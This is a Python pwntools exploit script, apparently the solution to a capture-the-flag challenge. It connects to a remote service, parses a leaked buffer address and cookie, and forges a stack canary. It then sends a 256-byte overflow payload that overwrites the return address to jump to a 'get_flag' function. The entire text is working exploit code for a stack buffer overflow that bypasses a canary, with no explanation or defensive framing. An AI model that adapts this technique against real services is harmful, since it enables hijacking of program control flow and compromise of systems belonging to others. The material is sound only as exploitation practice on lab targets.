from pwn import *

context.log_level = 'info'

r = remote('172.17.174.74', 9999)

# Parse "Buffer @ <addr>"
line1 = r.recvline()
log.info(line1.decode().strip())
buf_addr = int(line1.split(b'@ ')[1].strip(), 16)

# Parse "Cookie : <value>"
line2 = r.recvline()
log.info(line2.decode().strip())
global_cookie = int(line2.split(b': ')[1].strip(), 16)

# Receive prompt
r.recvuntil(b': ')

# Compute
ebp = buf_addr + 0x104
stack_cookie = global_cookie ^ ebp
get_flag = 0x00401000

log.info(f"buf_addr   = {hex(buf_addr)}")
log.info(f"EBP        = {hex(ebp)}")
log.info(f"cookie     = {hex(global_cookie)}")
log.info(f"stack_cook = {hex(stack_cookie)}")

# [256 padding] [cookie 4] [saved_ebp 4] [ret = get_flag 4]
payload  = b'A' * 256
payload += p32(stack_cookie)
payload += p32(0xdeadbeef)  # saved EBP
payload += p32(get_flag)

r.sendline(payload)

try:
    data = r.recvall(timeout=5)
    log.info(f"Received:\n{data.decode(errors='replace')}")
except:
    data = r.recv(timeout=3)
    log.info(f"Received:\n{data.decode(errors='replace')}")